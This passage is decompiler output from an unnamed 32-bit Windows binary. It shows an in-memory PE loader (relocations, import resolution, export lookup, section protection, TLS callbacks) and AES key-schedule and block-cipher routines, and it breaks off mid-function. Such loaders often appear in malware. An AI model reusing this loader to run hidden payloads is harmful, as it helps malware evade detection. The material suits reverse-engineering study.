int __cdecl FUN_0040264f(int *param_1,int param_2) {
  int iVar1;
  
  iVar1 = *(int *)(param_2 + 0x10);
  if (iVar1 == 0) {
    if ((*(uint *)(param_2 + 0x24) & 0x40) != 0) {
      return *(int *)(*param_1 + 0x20);
    }
    if ((*(uint *)(param_2 + 0x24) & 0x80) != 0) {
      iVar1 = *(int *)(*param_1 + 0x24);
    }
  }
  return iVar1;
}

uint __cdecl FUN_0040267b(int *param_1,LPVOID *param_2) {
  LPVOID dwSize;
  LPVOID pvVar1;
  uint flNewProtect;
  BOOL BVar2;
  
  dwSize = param_2[2];
  if (dwSize == (LPVOID)0x0) {
    flNewProtect = 1;
  }
  else {
    pvVar1 = param_2[3];
    if (((uint)pvVar1 & 0x2000000) == 0) {
      flNewProtect = *(uint *)(&DAT_0040f53c +
                              ((((uint)pvVar1 >> 0x1e & 1) + ((uint)pvVar1 >> 0x1d & 1) * 2) * 2 -
                              ((int)pvVar1 >> 0x1f)) * 4);
      if (((uint)pvVar1 & 0x4000000) != 0) {
        flNewProtect = flNewProtect | 0x200;
      }
      BVar2 = VirtualProtect(*param_2,(SIZE_T)dwSize,flNewProtect,(PDWORD)&param_2);
      flNewProtect = (uint)(BVar2 != 0);
    }
    else {
      if ((*param_2 == param_2[1]) &&
         (((param_2[4] != (LPVOID)0x0 || (*(uint *)(*param_1 + 0x38) == param_1[0xe])) ||
          ((uint)dwSize % param_1[0xe] == 0)))) {
        (*(code *)param_1[8])(*param_2,dwSize,0x4000,param_1[0xc]);
      }
      flNewProtect = 1;
    }
  }
  return flNewProtect;
}

undefined4 __cdecl FUN_0040271d(int *param_1) {
  int iVar1;
  code **ppcVar2;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0xc0) == 0) {
    return 1;
  }
  ppcVar2 = *(code ***)(*(int *)(*param_1 + 0xc0) + 0xc + iVar1);
  if (ppcVar2 != (code **)0x0) {
    while (*ppcVar2 != (code *)0x0) {
      (**ppcVar2)(iVar1,1,0);
      ppcVar2 = ppcVar2 + 1;
    }
  }
  return 1;
}

uint __cdecl FUN_00402758(int *param_1,int param_2) {
  int iVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  int *piVar5;
  int *piVar6;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0xa4) == 0) {
    uVar4 = (uint)(param_2 == 0);
  }
  else {
    piVar3 = (int *)(*(int *)(*param_1 + 0xa0) + iVar1);
    iVar2 = *piVar3;
    while (iVar2 != 0) {
      param_1 = (int *)0x0;
      piVar6 = piVar3 + 2;
      if ((piVar3[1] - 8U & 0xfffffffe) != 0) {
        do {
          if ((*(ushort *)piVar6 & 0xf000) == 0x3000) {
            piVar5 = (int *)(((uint)*(ushort *)piVar6 & 0xfff) + iVar2 + iVar1);
            *piVar5 = *piVar5 + param_2;
          }
          param_1 = (int *)((int)param_1 + 1);
          piVar6 = (int *)((int)piVar6 + 2);
        } while (param_1 < (int *)(piVar3[1] - 8U >> 1));
      }
      piVar3 = (int *)((int)piVar3 + piVar3[1]);
      iVar2 = *piVar3;
    }
    uVar4 = 1;
  }
  return uVar4;
}

int __cdecl FUN_004027df(uint *param_1) {
  uint uVar1;
  uint *puVar2;
  void *pvVar3;
  uint uVar4;
  int iVar5;
  int *lp;
  uint *puVar6;
  uint uVar7;
  DWORD dwErrCode;
  int local_c;
  
  puVar2 = param_1;
  uVar1 = param_1[1];
  iVar5 = 1;
  local_c = 1;
  if (*(int *)(*param_1 + 0x84) != 0) {
    lp = (int *)(*(int *)(*param_1 + 0x80) + uVar1);
    iVar5 = IsBadReadPtr(lp,0x14);
    while( true ) {
      if (iVar5 != 0) {
        return local_c;
      }
      if (lp[3] == 0) {
        return local_c;
      }
      iVar5 = (*(code *)puVar2[9])(lp[3] + uVar1,puVar2[0xc]);
      if (iVar5 == 0) break;
      pvVar3 = realloc((void *)puVar2[2],puVar2[3] * 4 + 4);
      if (pvVar3 == (void *)0x0) {
        (*(code *)puVar2[0xb])(iVar5,puVar2[0xc]);
        dwErrCode = 0xe;
        goto LAB_004028fd;
      }
      *(void **)(puVar2 + 2) = pvVar3;
      *(int *)((int)pvVar3 + puVar2[3] * 4) = iVar5;
      puVar2[3] = puVar2[3] + 1;
      if (*lp == 0) {
        puVar6 = (uint *)(uVar1 + lp[4]);
        param_1 = puVar6;
      }
      else {
        puVar6 = (uint *)(lp[4] + uVar1);
        param_1 = (uint *)(*lp + uVar1);
      }
      while (uVar4 = *param_1, uVar4 != 0) {
        if ((uVar4 & 0x80000000) == 0) {
          uVar7 = puVar2[0xc];
          uVar4 = uVar4 + uVar1 + 2;
        }
        else {
          uVar7 = puVar2[0xc];
          uVar4 = uVar4 & 0xffff;
        }
        uVar4 = (*(code *)puVar2[10])(iVar5,uVar4,uVar7);
        *puVar6 = uVar4;
        if (uVar4 == 0) {
          local_c = 0;
          break;
        }
        puVar6 = puVar6 + 1;
        param_1 = param_1 + 1;
      }
      if (local_c == 0) {
        (*(code *)puVar2[0xb])(iVar5,puVar2[0xc]);
        SetLastError(0x7f);
        return 0;
      }
      lp = lp + 5;
      iVar5 = IsBadReadPtr(lp,0x14);
    }
    dwErrCode = 0x7e;
LAB_004028fd:
    SetLastError(dwErrCode);
    local_c = 0;
    iVar5 = local_c;
  }
  return iVar5;
}

int __cdecl FUN_00402924(int *param_1,char *param_2) {
  int iVar1;
  uint uVar2;
  int iVar3;
  ushort *puVar4;
  int iVar5;
  int *piVar6;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0x7c) != 0) {
    iVar5 = *(int *)(*param_1 + 0x78);
    iVar3 = *(int *)(iVar5 + 0x18 + iVar1);
    iVar5 = iVar5 + iVar1;
    if ((iVar3 != 0) && (*(int *)(iVar5 + 0x14) != 0)) {
      if ((short)((uint)param_2 >> 0x10) == 0) {
        if (*(uint *)(iVar5 + 0x10) <= ((uint)param_2 & 0xffff)) {
          uVar2 = ((uint)param_2 & 0xffff) - *(uint *)(iVar5 + 0x10);
LAB_004029ba:
          if (uVar2 < *(uint *)(iVar5 + 0x14) || uVar2 == *(uint *)(iVar5 + 0x14)) {
            return *(int *)(*(int *)(iVar5 + 0x1c) + uVar2 * 4 + iVar1) + iVar1;
          }
        }
      }
      else {
        piVar6 = (int *)(*(int *)(iVar5 + 0x20) + iVar1);
        puVar4 = (ushort *)(*(int *)(iVar5 + 0x24) + iVar1);
        param_1 = (int *)0x0;
        if (iVar3 != 0) {
          do {
            iVar3 = _stricmp(param_2,(char *)(*piVar6 + iVar1));
            if (iVar3 == 0) {
              uVar2 = (uint)*puVar4;
              goto LAB_004029ba;
            }
            param_1 = (int *)((int)param_1 + 1);
            piVar6 = piVar6 + 1;
            puVar4 = puVar4 + 1;
          } while (param_1 < *(int **)(iVar5 + 0x18));
        }
      }
    }
  }
  SetLastError(0x7f);
  return 0;
}

void __cdecl FUN_004029cc(int *param_1) {
  int iVar1;
  HANDLE hHeap;
  int iVar2;
  DWORD dwFlags;
  
  if (param_1 != (int *)0x0) {
    if (param_1[4] != 0) {
      (*(code *)(*(int *)(*param_1 + 0x28) + param_1[1]))(param_1[1],0,0);
    }
    if (param_1[2] != 0) {
      iVar2 = 0;
      if (0 < param_1[3]) {
        do {
          iVar1 = *(int *)(param_1[2] + iVar2 * 4);
          if (iVar1 != 0) {
            (*(code *)param_1[0xb])(iVar1,param_1[0xc]);
          }
          iVar2 = iVar2 + 1;
        } while (iVar2 < param_1[3]);
      }
      free((void *)param_1[2]);
    }
    if (param_1[1] != 0) {
      (*(code *)param_1[8])(param_1[1],0,0x8000,param_1[0xc]);
    }
    dwFlags = 0;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,param_1);
  }
  return;
}

void __fastcall FUN_00402a46(undefined4 *param_1) {
  *(undefined *)(param_1 + 1) = 0;
  *param_1 = 0x40bc7c;
  return;
}

undefined4 * __thiscall FUN_00402a53(void *this,byte param_1) {
  FUN_00402a6f((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00402a6f(undefined4 *param_1) {
  *param_1 = 0x40bc7c;
  return;
}

void __thiscall FUN_00402a76(void *this,byte *param_1,uint *param_2,int param_3,byte *param_4) {
  undefined4 uVar1;
  uint uVar2;
  int iVar3;
  uint *puVar4;
  int iVar5;
  uint *puVar6;
  undefined4 *puVar7;
  int iVar8;
  int iVar9;
  undefined4 *puVar10;
  exception local_18 [20];
  
  if (param_1 == (byte *)0x0) {
    param_2 = &_Src_0040f57c;
    exception(local_18,(char **)&param_2);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_18,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (((param_3 != 0x10) && (param_3 != 0x18)) && (param_3 != 0x20)) {
    param_2 = &_Src_0040f57c;
    exception(local_18,(char **)&param_2);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_18,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (((param_4 != (byte *)0x10) && (param_4 != (byte *)0x18)) && (param_4 != &DAT_00000020)) {
    param_2 = &_Src_0040f57c;
    exception(local_18,(char **)&param_2);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_18,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  *(byte **)((int)this + 0x3cc) = param_4;
  *(int *)((int)this + 0x3c8) = param_3;
  memcpy((void *)((int)this + 0x3d0),param_2,(size_t)param_4);
  memcpy((void *)((int)this + 0x3f0),param_2,*(size_t *)((int)this + 0x3cc));
  if (*(int *)((int)this + 0x3c8) == 0x10) {
    if (*(int *)((int)this + 0x3cc) == 0x10) {
      iVar3 = 10;
    }
    else {
      iVar3 = ((uint)(*(int *)((int)this + 0x3cc) != 0x18) - 1 & 0xfffffffe) + 0xe;
    }
  }
  else {
    if (*(int *)((int)this + 0x3c8) != 0x18) {
      *(undefined4 *)((int)this + 0x410) = 0xe;
      goto LAB_00402b9a;
    }
    iVar3 = ((uint)(*(int *)((int)this + 0x3cc) == 0x20) - 1 & 0xfffffffe) + 0xe;
  }
  *(int *)((int)this + 0x410) = iVar3;
LAB_00402b9a:
  iVar3 = *(int *)((int)this + 0x3cc) / 4;
  iVar8 = 0;
  if (-1 < *(int *)((int)this + 0x410)) {
    puVar7 = (undefined4 *)((int)this + 8);
    do {
      iVar5 = iVar3;
      puVar10 = puVar7;
      if (0 < iVar3) {
        while (iVar5 != 0) {
          *puVar10 = 0;
          iVar5 = iVar5 + -1;
          puVar10 = puVar10 + 1;
        }
      }
      iVar8 = iVar8 + 1;
      puVar7 = puVar7 + 8;
    } while (iVar8 <= *(int *)((int)this + 0x410));
  }
  iVar8 = 0;
  if (-1 < *(int *)((int)this + 0x410)) {
    puVar7 = (undefined4 *)((int)this + 0x1e8);
    do {
      iVar5 = iVar3;
      puVar10 = puVar7;
      if (0 < iVar3) {
        while (iVar5 != 0) {
          *puVar10 = 0;
          iVar5 = iVar5 + -1;
          puVar10 = puVar10 + 1;
        }
      }
      iVar8 = iVar8 + 1;
      puVar7 = puVar7 + 8;
    } while (iVar8 <= *(int *)((int)this + 0x410));
  }
  puVar4 = (uint *)(*(int *)((int)this + 0x3c8) / 4);
  iVar8 = (*(int *)((int)this + 0x410) + 1) * iVar3;
  puVar6 = (uint *)((int)this + 0x414);
  param_2 = (void **)puVar4;
  if (0 < (int)puVar4) {
    do {
      *puVar6 = (uint)*param_1 << 0x18;
      *puVar6 = *puVar6 | (uint)param_1[1] << 0x10;
      *puVar6 = *puVar6 | (uint)param_1[2] << 8;
      *puVar6 = *puVar6 | (uint)param_1[3];
      param_1 = param_1 + 4;
      puVar6 = puVar6 + 1;
      param_2 = (void **)((int)param_2 + -1);
    } while (param_2 != (void **)0x0);
  }
  param_2 = (void **)0x0;
  if (0 < (int)puVar4) {
    puVar7 = (undefined4 *)((int)this + 0x414);
    do {
      if (iVar8 <= (int)param_2) goto LAB_00402e04;
      iVar5 = (int)param_2 / iVar3;
      iVar9 = (int)param_2 % iVar3;
      *(undefined4 *)((int)this + (iVar9 + iVar5 * 8) * 4 + 8) = *puVar7;
      param_2 = (void **)((int)param_2 + 1);
      uVar1 = *puVar7;
      puVar7 = puVar7 + 1;
      *(undefined4 *)((int)this + (iVar9 + (*(int *)((int)this + 0x410) - iVar5) * 8) * 4 + 0x1e8) =
           uVar1;
    } while ((int)param_2 < (int)puVar4);
  }
  if ((int)param_2 < iVar8) {
    param_4 = &DAT_0040bbfc;
    do {
      uVar2 = *(uint *)((int)this + (int)puVar4 * 4 + 0x410);
      *(uint *)((int)this + 0x414) =
           *(uint *)((int)this + 0x414) ^
           CONCAT31(CONCAT21(CONCAT11((&DAT_004089fc)[uVar2 >> 0x10 & 0xff] ^ *param_4,
                                      (&DAT_004089fc)[uVar2 >> 8 & 0xff]),
                             (&DAT_004089fc)[uVar2 & 0xff]),(&DAT_004089fc)[uVar2 >> 0x18]);
      param_4 = param_4 + 1;
      if (puVar4 == (uint *)0x8) {
        puVar6 = (uint *)((int)this + 0x418);
        iVar5 = 3;
        do {
          *puVar6 = *puVar6 ^ puVar6[-1];
          puVar6 = puVar6 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
        uVar2 = *(uint *)((int)this + 0x420);
        puVar6 = (uint *)((int)this + 0x428);
        *(uint *)((int)this + 0x424) =
             *(uint *)((int)this + 0x424) ^
             CONCAT31(CONCAT21(CONCAT11((&DAT_004089fc)[uVar2 >> 0x18],
                                        (&DAT_004089fc)[uVar2 >> 0x10 & 0xff]),
                               (&DAT_004089fc)[uVar2 >> 8 & 0xff]),(&DAT_004089fc)[uVar2 & 0xff]);
        iVar5 = 3;
        do {
          *puVar6 = *puVar6 ^ puVar6[-1];
          puVar6 = puVar6 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
      }
      else {
        if (1 < (int)puVar4) {
          puVar6 = (uint *)((int)this + 0x418);
          iVar5 = (int)puVar4 + -1;
          do {
            *puVar6 = *puVar6 ^ puVar6[-1];
            puVar6 = puVar6 + 1;
            iVar5 = iVar5 + -1;
          } while (iVar5 != 0);
        }
      }
      param_1 = (byte *)0x0;
      if (0 < (int)puVar4) {
        puVar7 = (undefined4 *)((int)this + 0x414);
        do {
          if (iVar8 <= (int)param_2) goto LAB_00402e04;
          iVar5 = (int)param_2 / iVar3;
          iVar9 = (int)param_2 % iVar3;
          *(undefined4 *)((int)this + (iVar9 + iVar5 * 8) * 4 + 8) = *puVar7;
          param_1 = param_1 + 1;
          uVar1 = *puVar7;
          puVar7 = puVar7 + 1;
          param_2 = (void **)((int)param_2 + 1);
          *(undefined4 *)
           ((int)this + (iVar9 + (*(int *)((int)this + 0x410) - iVar5) * 8) * 4 + 0x1e8) = uVar1;
        } while ((int)param_1 < (int)puVar4);
      }
    } while ((int)param_2 < iVar8);
  }
LAB_00402e04:
  param_4 = (byte *)0x1;
  if (1 < *(int *)((int)this + 0x410)) {
    param_2 = (void **)((int)this + 0x208);
    do {
      iVar8 = iVar3;
      puVar6 = (uint *)param_2;
      if (0 < iVar3) {
        do {
          uVar2 = *puVar6;
          *puVar6 = *(uint *)(&DAT_0040abfc + (uVar2 >> 0x18) * 4) ^
                    *(uint *)(&DAT_0040affc + (uVar2 >> 0x10 & 0xff) * 4) ^
                    *(uint *)(&DAT_0040b3fc + (uVar2 >> 8 & 0xff) * 4) ^
                    *(uint *)(&DAT_0040b7fc + (uVar2 & 0xff) * 4);
          iVar8 = iVar8 + -1;
          puVar6 = puVar6 + 1;
        } while (iVar8 != 0);
      }
      param_4 = param_4 + 1;
      param_2 = param_2 + 8;
    } while ((int)param_4 < *(int *)((int)this + 0x410));
  }
  *(undefined *)((int)this + 4) = 1;
  return;
}

// WARNING: Could not reconcile some variable overlaps

void __thiscall FUN_00402e7e(void *this,uint *param_1,byte *param_2) {
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  exception local_2c [12];
  void *local_20;
  uint local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  if (*(char *)((int)this + 4) != '\0') {
    local_14 = ((uint)*(byte *)param_1 << 0x18 | (uint)*(byte *)((int)param_1 + 1) << 0x10 |
                (uint)*(byte *)((int)param_1 + 2) << 8 | (uint)*(byte *)((int)param_1 + 3)) ^
               *(uint *)((int)this + 8);
    local_10 = ((uint)*(byte *)(param_1 + 1) << 0x18 | (uint)*(byte *)((int)param_1 + 5) << 0x10 |
                (uint)*(byte *)((int)param_1 + 6) << 8 | (uint)*(byte *)((int)param_1 + 7)) ^
               *(uint *)((int)this + 0xc);
    uVar4 = ((uint)*(byte *)(param_1 + 2) << 0x18 | (uint)*(byte *)((int)param_1 + 9) << 0x10 |
             (uint)*(byte *)((int)param_1 + 10) << 8 | (uint)*(byte *)((int)param_1 + 0xb)) ^
            *(uint *)((int)this + 0x10);
    iVar1 = *(int *)((int)this + 0x410);
    local_c = ((uint)CONCAT11(*(undefined *)((int)param_1 + 0xe),*(undefined *)((int)param_1 + 0xf))
              | (uint)*(byte *)(param_1 + 3) << 0x18 | (uint)*(byte *)((int)param_1 + 0xd) << 0x10)
              ^ *(uint *)((int)this + 0x14);
    if (1 < iVar1) {
      local_8 = iVar1 + -1;
      param_1 = (uint *)((int)this + 0x30);
      local_18 = uVar4;
      do {
        uVar5 = *(uint *)(&DAT_004093fc + (local_c >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00408ffc + (local_18 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_00408bfc + (local_10 >> 0x18) * 4) ^
                *(uint *)(&DAT_004097fc + (local_14 & 0xff) * 4) ^ param_1[-1];
        uVar4 = *(uint *)(&DAT_00408ffc + (local_c >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_00408bfc + (local_18 >> 0x18) * 4) ^
                *(uint *)(&DAT_004093fc + (local_14 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_004097fc + (local_10 & 0xff) * 4) ^ *param_1;
        uVar3 = *(uint *)(&DAT_00408bfc + (local_c >> 0x18) * 4) ^
                *(uint *)(&DAT_004093fc + (local_10 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00408ffc + (local_14 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_004097fc + (local_18 & 0xff) * 4) ^ param_1[1];
        local_14 = *(uint *)(&DAT_004093fc + (local_18 >> 8 & 0xff) * 4) ^
                   *(uint *)(&DAT_00408ffc + (local_10 >> 0x10 & 0xff) * 4) ^
                   *(uint *)(&DAT_00408bfc + (local_14 >> 0x18) * 4) ^
                   *(uint *)(&DAT_004097fc + (local_c & 0xff) * 4) ^ param_1[-2];
        local_8 = local_8 + -1;
        param_1 = param_1 + 8;
        local_18 = uVar4;
        local_10 = uVar5;
        local_c = uVar3;
      } while (local_8 != 0);
    }
    uVar2 = *(undefined4 *)(iVar1 * 0x20 + 8 + (int)this);
    iVar1 = iVar1 * 0x20 + 8 + (int)this;
    *param_2 = (&DAT_004089fc)[local_14 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[1] = (&DAT_004089fc)[local_10 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[2] = (&DAT_004089fc)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[3] = (&DAT_004089fc)[local_c & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(iVar1 + 4);
    param_2[4] = (&DAT_004089fc)[local_10 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[5] = (&DAT_004089fc)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[6] = (&DAT_004089fc)[local_c >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[7] = (&DAT_004089fc)[local_14 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(iVar1 + 8);
    param_2[8] = (&DAT_004089fc)[uVar4 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[9] = (&DAT_004089fc)[local_c >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[10] = (&DAT_004089fc)[local_14 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[0xb] = (&DAT_004089fc)[local_10 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(iVar1 + 0xc);
    param_2[0xc] = (&DAT_004089fc)[local_c >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[0xd] = (&DAT_004089fc)[local_14 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[0xe] = (&DAT_004089fc)[local_10 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[0xf] = (&DAT_004089fc)[uVar4 & 0xff] ^ (byte)local_8;
    return;
  }
  local_20 = this;
  exception(local_2c,&this_0040f570);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_2c,(ThrowInfo *)&pThrowInfo_0040d570);
}

// WARNING: Could not reconcile some variable overlaps

void __thiscall FUN_004031bc(void *this,byte *param_1,byte *param_2) {
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  uint uVar6;
  uint uVar7;
  exception local_30 [16];
  void *local_20;
  uint local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  if (*(char *)((int)this + 4) != '\0') {
    uVar4 = ((uint)*param_1 << 0x18 | (uint)param_1[1] << 0x10 | (uint)param_1[2] << 8 |
            (uint)param_1[3]) ^ *(uint *)((int)this + 0x1e8);
    local_14 = ((uint)param_1[4] << 0x18 | (uint)param_1[5] << 0x10 | (uint)param_1[6] << 8 |
               (uint)param_1[7]) ^ *(uint *)((int)this + 0x1ec);
    local_10 = ((uint)param_1[8] << 0x18 | (uint)param_1[9] << 0x10 | (uint)param_1[10] << 8 |
               (uint)param_1[0xb]) ^ *(uint *)((int)this + 0x1f0);
    iVar1 = *(int *)((int)this + 0x410);
    local_c = ((uint)CONCAT11(param_1[0xe],param_1[0xf]) |
              (uint)param_1[0xc] << 0x18 | (uint)param_1[0xd] << 0x10) ^ *(uint *)((int)this + 500);
    if (1 < iVar1) {
      puVar5 = (uint *)((int)this + 0x210);
      local_8 = iVar1 + -1;
      do {
        uVar7 = *(uint *)(&DAT_0040a3fc + (local_c >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00409bfc + (local_14 >> 0x18) * 4) ^
                *(uint *)(&DAT_00409ffc + (uVar4 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a7fc + (local_10 & 0xff) * 4) ^ puVar5[-1];
        uVar3 = *(uint *)(&DAT_00409bfc + (local_10 >> 0x18) * 4) ^
                *(uint *)(&DAT_00409ffc + (local_14 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a3fc + (uVar4 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a7fc + (local_c & 0xff) * 4) ^ *puVar5;
        uVar6 = *(uint *)(&DAT_00409bfc + (local_c >> 0x18) * 4) ^
                *(uint *)(&DAT_00409ffc + (local_10 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a3fc + (local_14 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a7fc + (uVar4 & 0xff) * 4) ^ puVar5[1];
        uVar4 = *(uint *)(&DAT_00409ffc + (local_c >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a3fc + (local_10 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00409bfc + (uVar4 >> 0x18) * 4) ^
                *(uint *)(&DAT_0040a7fc + (local_14 & 0xff) * 4) ^ puVar5[-2];
        puVar5 = puVar5 + 8;
        local_8 = local_8 + -1;
        local_14 = uVar7;
        local_10 = uVar3;
        local_c = uVar6;
      } while (local_8 != 0);
    }
    uVar2 = *(undefined4 *)(iVar1 * 0x20 + 0x1e8 + (int)this);
    iVar1 = iVar1 * 0x20 + 0x1e8 + (int)this;
    *param_2 = (&DAT_00408afc)[uVar4 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[1] = (&DAT_00408afc)[local_c >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[2] = (&DAT_00408afc)[local_10 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[3] = (&DAT_00408afc)[local_14 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(iVar1 + 4);
    param_2[4] = (&DAT_00408afc)[local_14 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[5] = (&DAT_00408afc)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[6] = (&DAT_00408afc)[local_c >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[7] = (&DAT_00408afc)[local_10 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(iVar1 + 8);
    param_2[8] = (&DAT_00408afc)[local_10 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[9] = (&DAT_00408afc)[local_14 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[10] = (&DAT_00408afc)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[0xb] = (&DAT_00408afc)[local_c & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(iVar1 + 0xc);
    param_2[0xc] = (&DAT_00408afc)[local_c >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[0xd] = (&DAT_00408afc)[local_10 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[0xe] = (&DAT_00408afc)[local_14 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[0xf] = (&DAT_00408afc)[uVar4 & 0xff] ^ (byte)local_8;
    return;
  }
  local_20 = this;
  exception(local_30,&this_0040f570);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_30,(ThrowInfo *)&pThrowInfo_0040d570);
}

void __thiscall FUN_0040350f(void *this,uint *param_1,byte *param_2) {
  undefined4 uVar1;
  uint *puVar2;
  int iVar3;
  int iVar4;
  uint *puVar5;
  byte *pbVar6;
  exception local_38 [12];
  uint local_2c;
  int local_28;
  int local_24;
  int local_20;
  uint *local_1c;
  int local_18;
  int local_14;
  int local_10;
  uint *local_c;
  uint *local_8;
  
  if (*(char *)((int)this + 4) == '\0') {
    exception(local_38,&this_0040f570);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_38,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (*(int *)((int)this + 0x3cc) == 0x10) {
    FUN_00402e7e(this,param_1,param_2);
  }
  else {
    iVar3 = *(int *)((int)this + 0x3cc) / 4;
    iVar4 = (-(uint)(iVar3 != 4) & (uint)(iVar3 != 6) + 1) * 0x20;
    local_1c = *(uint **)(&DAT_0040bc24 + iVar4);
    local_18 = *(int *)(&DAT_0040bc2c + iVar4);
    local_20 = *(int *)(&DAT_0040bc34 + iVar4);
    if (0 < iVar3) {
      puVar5 = (uint *)((int)this + 0x454);
      local_10 = iVar3;
      local_8 = (uint *)((int)this + 8);
      do {
        *puVar5 = (uint)*(byte *)param_1 << 0x18;
        *puVar5 = *puVar5 | (uint)*(byte *)((int)param_1 + 1) << 0x10;
        *puVar5 = *puVar5 | (uint)*(byte *)((int)param_1 + 2) << 8;
        *puVar5 = *puVar5 | (uint)*(byte *)((int)param_1 + 3);
        puVar2 = local_8 + 1;
        param_1 = param_1 + 1;
        *puVar5 = *puVar5 ^ *local_8;
        local_10 = local_10 + -1;
        puVar5 = puVar5 + 1;
        local_8 = puVar2;
      } while (local_10 != 0);
    }
    local_10 = 1;
    if (1 < *(int *)((int)this + 0x410)) {
      local_c = (uint *)((int)this + 0x28);
      do {
        if (0 < iVar3) {
          local_8 = local_c;
          local_24 = local_18 - (int)local_1c;
          param_1 = local_1c;
          local_28 = local_20 - (int)local_1c;
          puVar5 = (uint *)((int)this + 0x434);
          local_14 = iVar3;
          do {
            local_2c = (uint)*(byte *)((int)this + ((local_24 + (int)param_1) % iVar3) * 4 + 0x455);
            puVar2 = local_8 + 1;
            *puVar5 = *(uint *)(&DAT_004093fc + local_2c * 4) ^
                      *(uint *)(&DAT_004097fc +
                               (*(uint *)((int)this +
                                         ((local_28 + (int)param_1) % iVar3) * 4 + 0x454) & 0xff) *
                               4) ^
                      *(uint *)(&DAT_00408ffc +
                               (uint)*(byte *)((int)this + ((int)param_1 % iVar3) * 4 + 0x456) * 4)
                      ^ *(uint *)(&DAT_00408bfc + (uint)*(byte *)((int)puVar5 + 0x23) * 4) ^
                      *local_8;
            puVar5 = puVar5 + 1;
            param_1 = (uint *)((int)param_1 + 1);
            local_14 = local_14 + -1;
            local_8 = puVar2;
          } while (local_14 != 0);
        }
        memcpy((void *)((int)this + 0x454),(void *)((int)this + 0x434),iVar3 << 2);
        local_c = local_c + 8;
        local_10 = local_10 + 1;
      } while (local_10 < *(int *)((int)this + 0x410));
    }
    local_8 = (uint *)0x0;
    if (0 < iVar3) {
      pbVar6 = param_2;
      iVar4 = local_18;
      param_2 = (byte *)((int)this + 0x454);
      do {
        uVar1 = *(undefined4 *)
